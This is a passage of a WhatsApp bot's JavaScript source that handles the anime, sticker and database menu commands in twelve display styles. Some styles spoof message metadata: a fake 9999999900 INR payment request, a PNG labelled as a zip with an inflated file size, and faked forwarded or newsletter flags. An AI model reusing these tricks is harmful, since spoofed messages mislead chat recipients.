                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'animemenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${animemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'stickermenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${stickermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'databasemenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${databasemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
